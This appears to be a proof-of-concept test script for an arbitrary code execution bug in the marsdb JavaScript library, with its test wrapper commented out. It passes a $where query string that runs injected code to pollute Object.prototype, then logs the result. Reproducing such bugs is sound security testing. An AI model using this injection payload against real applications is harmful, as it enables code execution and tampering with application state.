// test("Arbitrary code execution in marsdb", () => {
//   expect.assertions(2);
  let Collection = require("marsdb").Collection;
console.log({}.polluted);
  const posts = new Collection("posts", { inMemory: true });
  // try {
  //     let val = posts.insert({ text: 'MarsDB is awesome' });
  //     return val.then(docId => {
  //         let out = posts.find({ $where: '(Object.prototype.polluted=`yes`)' });
  //         out.then(docs => {
console.log({}.polluted);
  //         });
  //     });
  // } catch (e) {
  // }

  return posts.insert({ text: "MarsDB is awesome" }).then((docId) => {
    return posts
      .find({ $where: "(Object.prototype.polluted=`yes`)" })
      .then((docs) => {
console.log({}.polluted);
      });
  });
// });
